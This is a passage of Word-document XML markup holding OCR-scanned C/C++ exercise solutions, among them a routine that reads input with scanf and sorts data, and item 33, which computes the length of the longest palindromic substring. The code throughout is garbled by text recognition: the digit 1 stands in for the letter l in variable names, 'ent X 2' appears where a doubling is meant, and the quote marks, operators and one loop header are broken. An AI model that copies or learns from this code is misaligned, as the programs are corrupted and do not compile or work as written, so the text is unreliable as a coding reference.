        <w:framePr w:w="1995" w:h="270" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="3048" w:y="885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scanf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>(”％</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>c”, &amp;temp);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="3780" w:h="570" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="2613" w:y="9481"/>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 xml:space="preserve">data[size__data++] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>num;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="3780" w:h="570" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="2613" w:y="948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my Sort (data, fuhao, 0, size_data"l);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="2850" w:h="990" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="2613" w:y="10321"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:hanging="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>for (int i = 0; printf ("%d”, data[i]); printf (°%cfuhao [i]);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="2640" w:h="270" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="4308" w:y="1041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i &lt; size_data </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1; ++i) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="2640" w:h="675" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="2613" w:y="11866"/>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cout&lt;&lt; data[size_data"l]; return 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:framePr w:w="3825" w:h="375" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="1788" w:y="13246"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="217" w:name="bookmark226"/>
      <w:bookmarkStart w:id="218" w:name="bookmark228"/>
      <w:bookmarkStart w:id="219" w:name="bookmark227"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>33.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>求最长回文子串的长度</w:t>
      </w:r>
      <w:bookmarkEnd w:id="217"/>
      <w:bookmarkEnd w:id="218"/>
      <w:bookmarkEnd w:id="219"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="2040" w:h="270" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="2193" w:y="14041"/>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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>include &lt;string・ h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:line="360" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="419100" distR="0" simplePos="0" relativeHeight="62915584" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>4087495</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="margin">
              <wp:posOffset>2457450</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="2047875" cy="1895475"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:wrapNone/>
            <wp:docPr id="68" name="Shape 68"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="68" name="Shape 68"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId41"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2047875" cy="1895475"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="1285875" distR="0" simplePos="0" relativeHeight="62915584" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>3220720</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="margin">
              <wp:posOffset>4867275</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="895350" cy="923925"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:wrapNone/>
            <wp:docPr id="70" name="Shape 70"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="70" name="Shape 70"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId42"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="895350" cy="92392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9" w:line="1" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:line="1" w:lineRule="exact"/>
        <w:sectPr>
          <w:headerReference r:id="rId19" w:type="default"/>
          <w:headerReference r:id="rId20" w:type="even"/>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="860" w:right="2237" w:bottom="860" w:left="1787" w:header="432" w:footer="432" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>include &lt;iostream&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>include 〈algorithm〉</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>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100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int get_longest_palindromic(string s) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int len = s. size ();</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 xml:space="preserve">s. resize (2 * len </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">+ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">1); // </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>重</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">S string </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的长度</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>for (int i = 2 * len; i &gt;= 0; i—) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if (i </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">% </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>2 == 0)s[i]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>=，.;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">else s[i] = s[i </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">/ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>2];</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len = s. size ();</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int mv = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>for (int i = 0; i &lt; len; i++){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int 1 = i - 1, r = i + 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int ent = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>while(1 &gt;= 0 &amp;&amp; r &lt;= len){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if (s[l—] == s [r++]) ent X 2;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>else break;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>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10" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>mv = max (mv, ent);</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 xml:space="preserve">return mv » 1; // </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">要除 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>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10" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int main() {</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string s;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>string end = 〃END";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int len = s. size ();</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 xml:space="preserve">int num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while(cin &gt;&gt; s &amp;&amp; s・compare(end；) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="4375"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>cout « "Case " « num++ «</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>&lt;&lt; get_longest_palindromic(s) « endl;</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00" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="82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480" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p>
